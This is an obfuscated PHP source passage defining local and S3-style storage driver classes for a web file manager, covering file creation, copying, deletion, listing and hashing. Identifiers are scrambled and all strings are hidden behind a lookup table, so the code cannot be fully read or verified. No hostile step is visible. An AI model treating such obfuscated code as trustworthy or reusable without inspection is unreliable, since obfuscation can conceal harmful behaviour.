<?php
 goto fÚé‰ğ„ÄÈ; cĞ‹ÈÓÜ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¸°ÓŞÜ) { if (substr($¸°ÓŞÜ, 0, 2) == $_SERVER[Î‹ÃÂŞ„][1410]) { $¸°ÓŞÜ = BASIC_PATH . substr($¸°ÓŞÜ, 2); } return $¸°ÓŞÜ; } public function iconvApp($ÁÍÏòÉ) { $ñüÉÇÉÙ =& $_SERVER[Î‹ÃÂŞ„]; global $config; return $this->iconvTo($ÁÍÏòÉ, $config[$ñüÉÇÉÙ[1408]], $config[$ñüÉÇÉÙ[1407]]); } public function iconvSystem($ëó÷äÙç) { $÷µš³œé =& $_SERVER[Î‹ÃÂŞ„]; global $config; return $this->iconvTo($ëó÷äÙç, $config[$÷µš³œé[1407]], $config[$÷µš³œé[1408]]); } public function getPathOuter($óÆ¡ÚÊæ) { $˜¥¼ÎÆÒ =& $_SERVER[Î‹ÃÂŞ„]; $´Úìœ“’ = $this->iconvApp($this->pathBase); $óÆ¡ÚÊæ = $this->iconvApp($óÆ¡ÚÊæ); if (substr($´Úìœ“’, 0, 2) == $˜¥¼ÎÆÒ[1410]) { $´Úìœ“’ = BASIC_PATH . substr($´Úìœ“’, 2); } if (substr($óÆ¡ÚÊæ, 0, 2) == $˜¥¼ÎÆÒ[1410]) { $óÆ¡ÚÊæ = BASIC_PATH . substr($óÆ¡ÚÊæ, 2); } $´Úìœ“’ = KodIO::clear($´Úìœ“’); $óÆ¡ÚÊæ = KodIO::clear($óÆ¡ÚÊæ); $óÆ¡ÚÊæ = substr($óÆ¡ÚÊæ, strlen($´Úìœ“’)); if (empty($this->pathDriver)) { return $óÆ¡ÚÊæ; } return $this->pathDriver . $˜¥¼ÎÆÒ[8] . ltrim($óÆ¡ÚÊæ, $˜¥¼ÎÆÒ[8]); } public function mkfile($ƒóçêè¨, $„šÜâö‚ = '', $†øë°ë = REPEAT_RENAME) { $ƒóçêè¨ = $this->iconvSystem($ƒóçêè¨); @touch($ƒóçêè¨); if ($„šÜâö‚) { file_put_contents($ƒóçêè¨, $„šÜâö‚); } @chmod($ƒóçêè¨, $this->pathAuth); return is_file($ƒóçêè¨) ? $this->getPathOuter($ƒóçêè¨) : !1; } public function mkdir($„šªÃÈ‰, $É¢‘Ìˆ = REPEAT_SKIP) { $„šªÃÈ‰ = $this->iconvSystem($„šªÃÈ‰); if (is_dir($„šªÃÈ‰)) { return $this->getPathOuter($„šªÃÈ‰); } @mkdir($„šªÃÈ‰, $this->pathAuth, !0); @chmod($„šªÃÈ‰, $this->pathAuth); return is_dir($„šªÃÈ‰) ? $this->getPathOuter($„šªÃÈ‰) : !1; } public function copyFile($ŞÓÂ’¹¾, $çš‡¿À) { $this->mkdir($this->pathFather($çš‡¿À)); $ŞÓÂ’¹¾ = $this->iconvSystem($ŞÓÂ’¹¾); $çš‡¿À = $this->iconvSystem($çš‡¿À); $ç¬òÙŸ = copy_64($ŞÓÂ’¹¾, $çš‡¿À); @chmod($çš‡¿À, $this->pathAuth); return $ç¬òÙŸ ? $this->getPathOuter($çš‡¿À) : !1; } public function moveFile($®‚±ÄÏ’, $œò³Úë®) { $this->mkdir($this->pathFather($œò³Úë®)); $®‚±ÄÏ’ = $this->iconvSystem($®‚±ÄÏ’); $œò³Úë® = $this->iconvSystem($œò³Úë®); $›áÒÑúš = intval(@rename($®‚±ÄÏ’, $œò³Úë®)); if (!$›áÒÑúš) { if ($›áÒÑúš = intval(@copy_64($®‚±ÄÏ’, $œò³Úë®))) { @unlink($®‚±ÄÏ’); } } @chmod($œò³Úë®, $this->pathAuth); return $›áÒÑúš ? $this->getPathOuter($œò³Úë®) : !1; } public function movePath($É· ü½, $¤Æ€£‡„, $¸û¦–ôÍ = false) { $õ•Áê =& $_SERVER[Î‹ÃÂŞ„]; $É· ü½ = $this->iconvSystem($É· ü½); $¤Æ€£‡„ = $this->iconvSystem($¤Æ€£‡„); $ŞÄáÀÍü = rtrim($¤Æ€£‡„, $õ•Áê[8]) . $õ•Áê[8] . ($¸û¦–ôÍ ? $¸û¦–ôÍ : get_path_this($É· ü½)); if (file_exists($ŞÄáÀÍü)) { return !1; } $£ˆ±µã = intval(@rename($É· ü½, $ŞÄáÀÍü)); $£ˆ±µã = file_exists($ŞÄáÀÍü); return $£ˆ±µã ? $this->getPathOuter($ŞÄáÀÍü) : !1; } public function delFile($ˆ¤³£) { $ˆ¤³£ = $this->iconvSystem($ˆ¤³£); if (!@unlink($ˆ¤³£)) { @chmod($ˆ¤³£, $this->pathAuth); if (!@unlink($ˆ¤³£)) { return !1; } } else { return !0; } } public function delFolder($œãÎ—ã) { $Ø§‘©û =& $_SERVER[Î‹ÃÂŞ„]; $œãÎ—ã = $this->iconvSystem($œãÎ—ã); if (!is_dir($œãÎ—ã)) { return !0; } if (!($ì‡¡øÌŒ = opendir($œãÎ—ã))) { return !1; } while (($ÉÓËò¡Ñ = readdir($ì‡¡øÌŒ)) !== !1) { if ($ÉÓËò¡Ñ == $Ø§‘©û[10] || $ÉÓËò¡Ñ == $Ø§‘©û[1333]) { continue; } $ÓˆÓÏ­â = $œãÎ—ã . $Ø§‘©û[8] . $ÉÓËò¡Ñ; if (is_file($ÓˆÓÏ­â) || is_link($ÓˆÓÏ­â)) { if (!unlink($ÓˆÓÏ­â)) { chmod($ÓˆÓÏ­â, $this->pathAuth); if (!unlink($ÓˆÓÏ­â)) { return !1; } } } else { if (is_dir($ÓˆÓÏ­â)) { chmod($ÓˆÓÏ­â, $this->pathAuth); $ÓˆÓÏ­â = $this->iconvApp($ÓˆÓÏ­â); if (!$this->delFolder($ÓˆÓÏ­â)) { return !1; } } } } closedir($ì‡¡øÌŒ); return rmdir($œãÎ—ã); } public function rename($øí•– À, $§æ¸÷¦) { $†±™«Õ³ =& $_SERVER[Î‹ÃÂŞ„]; $”³³èáÈ = $this->fileNameAuto($this->pathFather($øí•– À), $§æ¸÷¦); $”³³èáÈ = $this->iconvSystem($”³³èáÈ); $øí•– À = $this->iconvSystem($øí•– À); $Â‹ØõŒ = $this->pathFather($øí•– À); $äĞ¼Óğñ = rtrim($Â‹ØõŒ, $†±™«Õ³[8]) . $†±™«Õ³[8] . $”³³èáÈ; $ó°¢ÊÖ© = @rename($øí•– À, $äĞ¼Óğñ); $äĞ¼Óğñ = $this->iconvApp($äĞ¼Óğñ); return $ó°¢ÊÖ© ? $this->getPathOuter($äĞ¼Óğñ) : !1; } public function size($ô”ªœŠ) { $ô”ªœŠ = $this->iconvSystem($ô”ªœŠ); return filesize_64($ô”ªœŠ); } public function info($í£ø´ãÄ) { $í£ø´ãÄ = $this->iconvSystem($í£ø´ãÄ); if ($this->isFolder($í£ø´ãÄ)) { return $this->folderInfo($í£ø´ãÄ); } else { if ($this->isFile($í£ø´ãÄ)) { return $this->fileInfo($í£ø´ãÄ); } } return !1; } protected function infoChildren($œªªİÜ±, &$»ğÒÄ¤, $‡½¼ÄŸ´ = true) { $öÔàÆó =& $_SERVER[Î‹ÃÂŞ„]; check_abort_echo(); $œªªİÜ± = rtrim($œªªİÜ±, $öÔàÆó[8]) . $öÔàÆó[8]; if ($‡½¼ÄŸ´) { $œªªİÜ± = $this->iconvSystem($œªªİÜ±); } if (!($—’¶¤ = @opendir($œªªİÜ±))) { return; } while (($›»Ú®–· = readdir($—’¶¤)) !== !1) { if ($›»Ú®–· == $öÔàÆó[10] || $›»Ú®–· == $öÔàÆó[1333]) { continue; } $‰ı¨Æô = $œªªİÜ± . $›»Ú®–·; if (is_file($‰ı¨Æô) || is_link($‰ı¨Æô)) { $»ğÒÄ¤[$öÔàÆó[79]]++; $»ğÒÄ¤[$öÔàÆó[78]] += filesize_64($‰ı¨Æô); } else { if (is_dir($‰ı¨Æô)) { $»ğÒÄ¤[$öÔàÆó[80]]++; $this->infoChildren($‰ı¨Æô, $»ğÒÄ¤, !1); } } } closedir($—’¶¤); } private function folderInfo($ùéÚ¤õ¬, $²ĞÙ¿ÃÁ = false) { $Şğº”•´ =& $_SERVER[Î‹ÃÂŞ„]; $ùéÚ¤õ¬ = rtrim($ùéÚ¤õ¬, $Şğº”•´[8]) . $Şğº”•´[8]; $ğûµ’Ş = $this->iconvApp($this->pathThis($ùéÚ¤õ¬)); if ($²ĞÙ¿ÃÁ) { return array($Şğº”•´[32] => $ğûµ’Ş, $Şğº”•´[86] => $this->getPathOuter($ùéÚ¤õ¬), $Şğº”•´[33] => $Şğº”•´[77]); } $²üá›öÕ = array($Şğº”•´[32] => $ğûµ’Ş, $Şğº”•´[86] => $this->getPathOuter($ùéÚ¤õ¬), $Şğº”•´[33] => $Şğº”•´[77], $Şğº”•´[217] => @filectime($ùéÚ¤õ¬), $Şğº”•´[87] => @filemtime($ùéÚ¤õ¬), $Şğº”•´[1419] => @fileatime($ùéÚ¤õ¬), $Şğº”•´[1420] => is_readable($ùéÚ¤õ¬), $Şğº”•´[1421] => is_writable($ùéÚ¤õ¬), $Şğº”•´[1422] => get_mode($ùéÚ¤õ¬)); return $²üá›öÕ; } private function fileInfo($Ü‚º¨á×, $˜Â„è = false) { $—çüü¥ =& $_SERVER[Î‹ÃÂŞ„]; $ÓÇ‚Å‚ = $this->iconvApp($this->pathThis($Ü‚º¨á×)); if ($˜Â„è) { return array($—çüü¥[32] => $ÓÇ‚Å‚, $—çüü¥[86] => $this->getPathOuter($Ü‚º¨á×), $—çüü¥[33] => $—çüü¥[216], $—çüü¥[78] => $this->size($Ü‚º¨á×), $—çüü¥[177] => $this->ext($ÓÇ‚Å‚)); } $Ä™Ò¹¢ = array($—çüü¥[32] => $ÓÇ‚Å‚, $—çüü¥[86] => $this->getPathOuter($Ü‚º¨á×), $—çüü¥[33] => $—çüü¥[216], $—çüü¥[217] => @filectime($Ü‚º¨á×), $—çüü¥[87] => @filemtime($Ü‚º¨á×), $—çüü¥[1419] => @fileatime($Ü‚º¨á×), $—çüü¥[78] => $this->size($Ü‚º¨á×), $—çüü¥[177] => $this->ext($ÓÇ‚Å‚), $—çüü¥[1420] => is_readable($Ü‚º¨á×), $—çüü¥[1421] => is_writable($Ü‚º¨á×), $—çüü¥[1422] => get_mode($Ü‚º¨á×)); return $Ä™Ò¹¢; } public function exist($†’¹ä†) { $†’¹ä† = $this->iconvSystem($†’¹ä†); return @file_exists($†’¹ä†); } public function isFile($¯øØ’”õ) { $¯øØ’”õ = $this->iconvSystem($¯øØ’”õ); return @is_file($¯øØ’”õ); } public function isFolder($ú•ğ‚ã) { $ú•ğ‚ã = $this->iconvSystem($ú•ğ‚ã); return @is_dir($ú•ğ‚ã); } public function listPath($É†®åÎ, $çßŒ âÊ = false) { $ÈŒ…öÂ¸ =& $_SERVER[Î‹ÃÂŞ„]; $É†®åÎ = $this->iconvSystem($É†®åÎ); $É†®åÎ = rtrim($É†®åÎ, $ÈŒ…öÂ¸[8]) . $ÈŒ…öÂ¸[8]; $ ›î¯´· = array($ÈŒ…öÂ¸[84] => array(), $ÈŒ…öÂ¸[85] => array()); if (!($¬÷øñÄí = @opendir($É†®åÎ))) { return $ ›î¯´·; } while (($Ä»Ù‘Ö = readdir($¬÷øñÄí)) !== !1) { if ($Ä»Ù‘Ö == $ÈŒ…öÂ¸[10] || $Ä»Ù‘Ö == $ÈŒ…öÂ¸[1333]) { continue; } $Èä¢¼ğ = $É†®åÎ . $Ä»Ù‘Ö; if (is_file($Èä¢¼ğ)) { $ ›î¯´·[$ÈŒ…öÂ¸[85]][] = $this->fileInfo($Èä¢¼ğ, $çßŒ âÊ); } else { $ ›î¯´·[$ÈŒ…öÂ¸[84]][] = $this->folderInfo($Èä¢¼ğ, $çßŒ âÊ); } } closedir($¬÷øñÄí); return $ ›î¯´·; } public function listAll($À§î›â, &$ı½‡ÇÒõ = array()) { $Ô…áŒ³Ù =& $_SERVER[Î‹ÃÂŞ„]; $À§î›â = $this->iconvSystem($À§î›â); $À§î›â = rtrim($À§î›â, $Ô…áŒ³Ù[8]) . $Ô…áŒ³Ù[8]; if (!($ã€öÓùÆ = @opendir($À§î›â))) { return $ı½‡ÇÒõ; } while (($Ì×ïËçÛ = readdir($ã€öÓùÆ)) !== !1) { if ($Ì×ïËçÛ == $Ô…áŒ³Ù[10] || $Ì×ïËçÛ == $Ô…áŒ³Ù[1333]) { continue; } $ë“õ©™’ = $À§î›â . $Ì×ïËçÛ; $¯´çå° = is_dir($ë“õ©™’) && !is_link($ë“õ©™’) ? 1 : 0; $ë“õ©™’ = $¯´çå° ? $ë“õ©™’ . $Ô…áŒ³Ù[8] : $ë“õ©™’; $ı½‡ÇÒõ[] = array($Ô…áŒ³Ù[86] => $ë“õ©™’, $Ô…áŒ³Ù[77] => $¯´çå°, $Ô…áŒ³Ù[87] => intval(@filemtime($ë“õ©™’)), $Ô…áŒ³Ù[78] => $¯´çå° ? 0 : intval($this->size($ë“õ©™’))); if ($¯´çå°) { $this->listAll($ë“õ©™’, $ı½‡ÇÒõ); } } closedir($ã€öÓùÆ); return $ı½‡ÇÒõ; } public function has($ÏİÍ‰‚ˆ, $áÁÍ¸Š« = false, $Öäùİì = true) { $‰¿é©ËŞ =& $_SERVER[Î‹ÃÂŞ„]; $ÏİÍ‰‚ˆ = $this->iconvSystem($ÏİÍ‰‚ˆ); $ÏİÍ‰‚ˆ = rtrim($ÏİÍ‰‚ˆ, $‰¿é©ËŞ[8]) . $‰¿é©ËŞ[8]; if (!($´¦‡ÛÌá = @opendir($ÏİÍ‰‚ˆ))) { return !1; } $«¤È„˜› = 0; $ÁĞÅİó¤ = 0; $ ëƒõ = 0; while (($›â‡òêí = readdir($´¦‡ÛÌá)) !== !1) { if ($›â‡òêí == $‰¿é©ËŞ[10] || $›â‡òêí == $‰¿é©ËŞ[1333]) { continue; } $š›€ŞÏ = $ÏİÍ‰‚ˆ . $›â‡òêí; if ($áÁÍ¸Š«) { $ ëƒõ++; if (@is_file($š›€ŞÏ)) { $«¤È„˜›++; } else { $ÁĞÅİó¤++; } if ($ ëƒõ > 10000) { break; } continue; } if ($Öäùİì) { if (@is_file($š›€ŞÏ)) { return !0; } } else { if (@is_dir($š›€ŞÏ . $‰¿é©ËŞ[8])) { return !0; } } } closedir($´¦‡ÛÌá); if ($áÁÍ¸Š«) { return array($‰¿é©ËŞ[225] => $«¤È„˜›, $‰¿é©ËŞ[226] => $ÁĞÅİó¤); } return !1; } public function hashSimple($Ğáì‚Î¹) { $÷ËÚÀ´ =& $_SERVER[Î‹ÃÂŞ„]; if (!$Ğáì‚Î¹) { return md5($÷ËÚÀ´[12]); } $Ğáì‚Î¹ = $this->iconvSystem($Ğáì‚Î¹); $ßÀµ«–¢ = $this->size($Ğáì‚Î¹); $şÖ«–Ä = 200; $Æş–†‹Í = 50; if ($ßÀµ«–¢ <= $şÖ«–Ä * $Æş–†‹Í) { return $this->hashMd5($Ğáì‚Î¹) . $ßÀµ«–¢; } $¿ø‰ß’‡ = $÷ËÚÀ´[12]; $İ“äÃñã = intval($ßÀµ«–¢ / $Æş–†‹Í); $™˜±úİ° = fopen($Ğáì‚Î¹, $÷ËÚÀ´[1423]); if (!$™˜±úİ°) { return $¿ø‰ß’‡; } for ($èßı©‘ä = 0; $èßı©‘ä < $Æş–†‹Í; $èßı©‘ä++) { fseek_64($™˜±úİ°, $İ“äÃñã * $èßı©‘ä); $¿ø‰ß’‡ .= fread($™˜±úİ°, $şÖ«–Ä); } fseek_64($™˜±úİ°, $ßÀµ«–¢ - $şÖ«–Ä); $¿ø‰ß’‡ .= fread($™˜±úİ°, $şÖ«–Ä); fclose($™˜±úİ°); return md5($¿ø‰ß’‡) . $ßÀµ«–¢; } public function getContent($ØÍî›·õ) { $ØÍî›·õ = $this->iconvSystem($ØÍî›·õ); return file_get_contents($ØÍî›·õ); } public function setContent($Š¥şí¾ª, $Ñ…õ‚ = '') { $Š¥şí¾ª = $this->iconvSystem($Š¥şí¾ª); $¥ê§¼®ı = @file_put_contents($Š¥şí¾ª, $Ñ…õ‚, LOCK_EX); clearstatcache(); @chmod($Š¥şí¾ª, $this->pathAuth); return $¥ê§¼®ı === !1 ? !1 : !0; } public function fileSubstr($ÓõüÕ¡º, $ •…á… = 0, $“·¥º£Ø = false) { $Ó¨Û×Ú =& $_SERVER[Î‹ÃÂŞ„]; $ÓõüÕ¡º = $this->iconvSystem($ÓõüÕ¡º); if ($“·¥º£Ø === !1) { $“·¥º£Ø = $this->size($ÓõüÕ¡º); } if ($“·¥º£Ø <= 0) { return $Ó¨Û×Ú[12]; } $»êÚ•€” = fopen($ÓõüÕ¡º, $Ó¨Û×Ú[1423]); if (!$»êÚ•€”) { return !1; } fseek_64($»êÚ•€”, $ •…á…); $ùÇáüÜ = fread($»êÚ•€”, $“·¥º£Ø); fclose($»êÚ•€”); return $ùÇáüÜ; } public function upload($ê¯Å§Ãí, $ú†òô¸, $ı”Ú˜ô“ = false, $ØŸİÆ² = REPEAT_REPLACE) { if ($ı”Ú˜ô“) { return $this->moveFile($ú†òô¸, $ê¯Å§Ãí); } return $this->copyFile($ú†òô¸, $ê¯Å§Ãí); } public function setModifyTime($˜ÈÓ´€, $‹Ç»†Åí = '') { @touch($˜ÈÓ´€, intval($‹Ç»†Åí)); } public function download($Ìå§·—½, $Ÿ­ªÔÈ) { return $this->iconvSystem($Ìå§·—½); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ªéü¥Ù¯) { parent::__construct($ªéü¥Ù¯); $this->signatureVersion($_SERVER[Î‹ÃÂŞ„][233]); } public function fileOutImage($åƒª‹ìÅ, $Š°òıï = 250) { $‚şÑï¢è =& $_SERVER[Î‹ÃÂŞ„]; if ($this->size($åƒª‹ìÅ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($åƒª‹ìÅ, $Š°òıï); } $ŠÇ†Å‡ = array($‚şÑï¢è[1424] => $‚şÑï¢è[1425] . $Š°òıï . $‚şÑï¢è[1426]); $Éıƒ¸ê• = $this->link($åƒª‹ìÅ, $ŠÇ†Å‡); $this->fileOutLink($Éıƒ¸ê•); } public function fileOutLink($¯©ÓÀó) { $ü‚¹¬¿¬ =& $_SERVER[Î‹ÃÂŞ„]; if (substr($¯©ÓÀó, 0, 7) == $ü‚¹¬¿¬[1386]) { $¯©ÓÀó = $ü‚¹¬¿¬[1387] . substr($¯©ÓÀó, 7); } header($ü‚¹¬¿¬[164] . $¯©ÓÀó); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ï é–ûá) { parent::__construct($Ï é–ûá); $this->signatureVersion($_SERVER[Î‹ÃÂŞ„][233]); } public function fileOutLink($òåşáÉ®) { $ĞÅÊ° =& $_SERVER[Î‹ÃÂŞ„]; if (substr($òåşáÉ®, 0, 7) == $ĞÅÊ°[1386]) { $òåşáÉ® = $ĞÅÊ°[1387] . substr($òåşáÉ®, 7); } header($ĞÅÊ°[164] . $òåşáÉ®); die; } } goto fËº¼äÎœ; FÖ¢ğïÜÜ†: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $áÖ‚ÌÉ =& $_SERVER[Î‹ÃÂŞ„]; $this->objectDriver = array($áÖ‚ÌÉ[60], $áÖ‚ÌÉ[61], $áÖ‚ÌÉ[62], $áÖ‚ÌÉ[63], $áÖ‚ÌÉ[64], $áÖ‚ÌÉ[65], $áÖ‚ÌÉ[66], $áÖ‚ÌÉ[67], $áÖ‚ÌÉ[68], $áÖ‚ÌÉ[69], $áÖ‚ÌÉ[70]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ôàÖÔ’·) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ôàÖÔ’·, $_SERVER[Î‹ÃÂŞ„][8]); } return $ôàÖÔ’·; } public function iconvApp($Ş²ò§Çä) { return $Ş²ò§Çä; } public function iconvSystem($ìŠ×££) { return $ìŠ×££; } public function iconvTo($è„…‡š¾, $Ÿ‘ÒÚ’, $ŠŞ…ŞõØ) { $ÓÑŞâ’Û =& $_SERVER[Î‹ÃÂŞ„]; if (!$è„…‡š¾ || !function_exists($ÓÑŞâ’Û[71])) { return $è„…‡š¾; } static $èô‹íéŸ = array(); $¤êï¯Á“ = $Ÿ‘ÒÚ’ . $ÓÑŞâ’Û[72] . $ŠŞ…ŞõØ . $ÓÑŞâ’Û[73] . $è„…‡š¾; if (isset($èô‹íéŸ[$¤êï¯Á“])) { return $èô‹íéŸ[$¤êï¯Á“]; } if (function_exists($ÓÑŞâ’Û[74])) { $â­î²ÏÀ = @mb_convert_encoding($è„…‡š¾, $ŠŞ…ŞõØ, $Ÿ‘ÒÚ’); } else { $â­î²ÏÀ = @iconv($Ÿ‘ÒÚ’, $ŠŞ…ŞõØ, $è„…‡š¾); } $â­î²ÏÀ = $â­î²ÏÀ ? $â­î²ÏÀ : $è„…‡š¾; if (strstr($â­î²ÏÀ, $ÓÑŞâ’Û[75])) { $â­î²ÏÀ = str_replace($ÓÑŞâ’Û[75], $ÓÑŞâ’Û[11], $â­î²ÏÀ); } $èô‹íéŸ[$Ÿ‘ÒÚ’ . $ÓÑŞâ’Û[72] . $ŠŞ…ŞõØ . $ÓÑŞâ’Û[73] . $è„…‡š¾] = $â­î²ÏÀ; $èô‹íéŸ[$ŠŞ…ŞõØ . $ÓÑŞâ’Û[72] . $Ÿ‘ÒÚ’ . $ÓÑŞâ’Û[73] . $è„…‡š¾] = $è„…‡š¾; $èô‹íéŸ[$ŠŞ…ŞõØ . $ÓÑŞâ’Û[72] . $Ÿ‘ÒÚ’ . $ÓÑŞâ’Û[73] . $â­î²ÏÀ] = $è„…‡š¾; $èô‹íéŸ[$Ÿ‘ÒÚ’ . $ÓÑŞâ’Û[72] . $ŠŞ…ŞõØ . $ÓÑŞâ’Û[73] . $â­î²ÏÀ] = $â­î²ÏÀ; return $â­î²ÏÀ; } public function getPathInner($ûøËÓß¤) { $ı»Šûú = IO::init($ûøËÓß¤); return $ı»Šûú->path; } public function getPathOuter($ñµû§äŞ) { $Í«äÁ­– =& $_SERVER[Î‹ÃÂŞ„]; $õ·¹Ç©© = strlen(trim($this->pathBase, $Í«äÁ­–[8])); $ñµû§äŞ = substr(trim($ñµû§äŞ, $Í«äÁ­–[8]), $õ·¹Ç©©); return $this->pathDriver . $Í«äÁ­–[8] . ltrim($ñµû§äŞ, $Í«äÁ­–[8]); } public function isParentOf($İ®¬ŠŞ‡, $–á”È­Ó) { $¿ÎÜúÏ½ =& $_SERVER[Î‹ÃÂŞ„]; $İ®¬ŠŞ‡ = rtrim(strtolower($İ®¬ŠŞ‡), $¿ÎÜúÏ½[8]) . $¿ÎÜúÏ½[8]; $–á”È­Ó = rtrim(strtolower($–á”È­Ó), $¿ÎÜúÏ½[8]) . $¿ÎÜúÏ½[8]; $ìæ•ñ¼ = strpos($–á”È­Ó, $İ®¬ŠŞ‡) === 0; return $ìæ•ñ¼; } public function getType() { $æ’õ½¯Ï =& $_SERVER[Î‹ÃÂŞ„]; $ñàÏ„™ä = str_replace($æ’õ½¯Ï[76], $æ’õ½¯Ï[12], get_class($this)); return strtolower($ñàÏ„™ä); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¿–¹¢ïæ, $‘Æ»¦Šç) { $à¤İ©­ğ =& $_SERVER[Î‹ÃÂŞ„]; $ûœ ¤†õ = rtrim($¿–¹¢ïæ, $à¤İ©­ğ[8]) . $à¤İ©­ğ[8] . $‘Æ»¦Šç; $˜à‡¶‹³ = $this->exist($ûœ ¤†õ); return $˜à‡¶‹³ ? $ûœ ¤†õ : !1; } public function setModifyTime($ã¨ªÍ¤ë, $åûùû™’ = '') { } public function renameObject($ÓİğòÕ¬, $’¾±†Œ) { $¦È¢·šŠ = $’¾±†Œ; $ÓİğòÕ¬ = $this->getPathOuter($ÓİğòÕ¬); $’¾±†Œ = $this->pathFather($ÓİğòÕ¬) . $’¾±†Œ; $ëÍŸ½š€ = IO::copy($ÓİğòÕ¬, $this->pathFather($ÓİğòÕ¬), REPEAT_RENAME_FOLDER, $¦È¢·šŠ); if ($ëÍŸ½š€) { IO::remove($ÓİğòÕ¬); } return $ëÍŸ½š€ ? $’¾±†Œ : !1; } public function tempFile($‡ÑÅÓË· = '', $„ˆ˜ĞğÓ = '') { if (!$‡ÑÅÓË·) { $‡ÑÅÓË· = rand_string(15); } $ Ò®èâ… = TEMP_FILES . rand_string(15) . $_SERVER[Î‹ÃÂŞ„][8]; @mkdir($ Ò®èâ…, DEFAULT_PERRMISSIONS, !0); $¨€ûÕ¨ = $ Ò®èâ… . $‡ÑÅÓË·; @touch($¨€ûÕ¨); if ($„ˆ˜ĞğÓ) { file_put_contents($¨€ûÕ¨, $„ˆ˜ĞğÓ); } return $¨€ûÕ¨; } public function tempFileRemve($è²’¶÷) { @unlink($è²’¶÷); @rmdir($this->pathFather($è²’¶÷)); } public function mkfile($³ñßå¢ˆ, $ö…¡„ıú = '', $ƒœƒ„ñº = REPEAT_RENAME) { } public function mkdir($Œ˜á–Ì­, $éØâ¸º = REPEAT_SKIP) { } public function delFile($´¸®ÙĞ„) { } public function delFolder($Ôş‡ĞÎƒ) { } public function copyFile($ÂÃĞÓë, $İ¥Ÿàˆ½) { } public function moveFile($ÃÂ–Í«‘, $ å˜”úÁ) { } public function remove($÷¼˜áÚŠ) { if ($this->isFile($÷¼˜áÚŠ)) { return $this->delFile($÷¼˜áÚŠ); } return $this->delFolder($÷¼˜áÚŠ); } public function rename($Ç€÷’ô€, $õ–°ÌÜ) { } public function exist($ûñÓÇ’¹) { } public function findByHash($ÛˆÈ‹ = '', $úû›•ØÓ = '') { return !1; } public function isFile($Ô‹èÇ¨ª) { } public function isFolder($³â—õÄ) { } public function size($Áşìû–) { } public function info($ÁßËæù) { } public function infoSimple($ºÆìµ¶) { return $this->info($ºÆìµ¶); } public function infoAuth($Ø¦ï™ó) { return $this->info($Ø¦ï™ó); } public function infoFull($Çï¿ôÉû) { return $this->info($Çï¿ôÉû); } public function infoFullSimple($ˆÁù¸Ş¯) { return $this->info($ˆÁù¸Ş¯); } public function infoWithChildren($¤¹€¹¬À) { $õó—ôîà =& $_SERVER[Î‹ÃÂŞ„]; static $—ËŞÂĞÀ = array(); if (isset($—ËŞÂĞÀ[$¤¹€¹¬À])) { return $—ËŞÂĞÀ[$¤¹€¹¬À]; } $”•µï‡° = $this->info($¤¹€¹¬À); if ($”•µï‡° && $”•µï‡°[$õó—ôîà[33]] == $õó—ôîà[77]) { $§›…ŞÜá = array($õó—ôîà[78] => 0, $õó—ôîà[79] => 0, $õó—ôîà[80] => 0); $this->infoChildren($¤¹€¹¬À, $§›…ŞÜá); $”•µï‡°[$õó—ôîà[78]] = $§›…ŞÜá[$õó—ôîà[78]]; $”•µï‡°[$õó—ôîà[81]] = array($õó—ôîà[82] => $§›…ŞÜá[$õó—ôîà[79]], $õó—ôîà[83] => $§›…ŞÜá[$õó—ôîà[80]]); $—ËŞÂĞÀ[$¤¹€¹¬À] = $”•µï‡°; } return $”•µï‡°; } public function listPath($É¦Ææ„“, $¿õ½¯Ú„ = false) { } public function has($Í³ÉÍ‡, $š×Êí×ó = false, $¿­–êë‰ = false) { } public function canRead($²ŞùÃóŒ) { } public function canWrite($ğÎÍô¢Û) { } public function getContent($ª‡şî) { } public function setContent($ËŸ¢ïò–, $­Õ­«Òş = '') { } protected function infoChildren($È•ºÅÕ, &$Îëß¡¹) { $Ëüı½Ô‚ =& $_SERVER[Î‹ÃÂŞ„]; check_abort_echo(); $Ó¹ùš = $this->listPath($È•ºÅÕ, !0); $Ó¹ùš = array_merge($Ó¹ùš[$Ëüı½Ô‚[84]], $Ó¹ùš[$Ëüı½Ô‚[85]]); foreach ($Ó¹ùš as $ÏŒş½¿Ó) { if ($ÏŒş½¿Ó[$Ëüı½Ô‚[33]] == $Ëüı½Ô‚[77]) { $Îëß¡¹[$Ëüı½Ô‚[80]]++; $½¶×ÔŸ› = $this->getPathInner($ÏŒş½¿Ó[$Ëüı½Ô‚[86]]); $this->infoChildren($½¶×ÔŸ›, $Îëß¡¹); } else { $Îëß¡¹[$Ëüı½Ô‚[79]]++; $Îëß¡¹[$Ëüı½Ô‚[78]] += $ÏŒş½¿Ó[$Ëüı½Ô‚[78]]; } } } public function fileSubstr($Ç†üñ¶Ù, $ííå‚´, $ÈÂî›š‘) { } public function listAll($Ô¶ƒ†ÅË) { } public function listAllMake($ËİÆ”Î¦, &$ÎÌ¥Åâú) { $Îî¼Áõø =& $_SERVER[Î‹ÃÂŞ„]; check_abort_echo(); $‘ªÜôïŠ = $this->listPath($ËİÆ”Î¦, !0); if (!$‘ªÜôïŠ) { return; } $ŞÌÙŠµÈ = array_merge($‘ªÜôïŠ[$Îî¼Áõø[84]], $‘ªÜôïŠ[$Îî¼Áõø[85]]); foreach ($ŞÌÙŠµÈ as $ì³¾ÈÆ) { $÷Ç¨Ø—á = $ì³¾ÈÆ[$Îî¼Áõø[33]] == $Îî¼Áõø[77]; $°õÃ•æ = array($Îî¼Áõø[86] => $ì³¾ÈÆ[$Îî¼Áõø[86]], $Îî¼Áõø[77] => $÷Ç¨Ø—á); if (isset($ì³¾ÈÆ[$Îî¼Áõø[78]])) { $°õÃ•æ[$Îî¼Áõø[78]] = $ì³¾ÈÆ[$Îî¼Áõø[78]]; } if (isset($ì³¾ÈÆ[$Îî¼Áõø[87]])) { $°õÃ•æ[$Îî¼Áõø[87]] = $ì³¾ÈÆ[$Îî¼Áõø[87]]; } if (!$÷Ç¨Ø—á) { $ÎÌ¥Åâú[] = $°õÃ•æ; continue; } 